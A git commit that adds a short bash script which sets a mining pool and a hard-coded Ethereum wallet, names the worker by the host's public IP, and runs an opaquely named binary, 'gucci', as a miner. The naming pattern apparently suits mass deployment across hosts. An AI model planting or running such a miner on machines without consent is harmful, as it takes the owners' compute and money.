6ee520a585b521c6b0d71fa47d1684ba8e44b6bb
muna02 <77324807+muna02@users.noreply.github.com>
2021-01-12 16:44:02 +0700

    Add files via upload

---
+++ launcher2.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=asia.sparkpool.com:3333
+WALLET=0x21f6c5cb2e1c8230126a302f675e3869319476dc
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Asia
+
+cd "$(dirname "$0")"
+
+chmod +x ./gucci && ./gucci --algo ETHASH --pool $POOL --user $WALLET.$WORKER --tls 1 $@
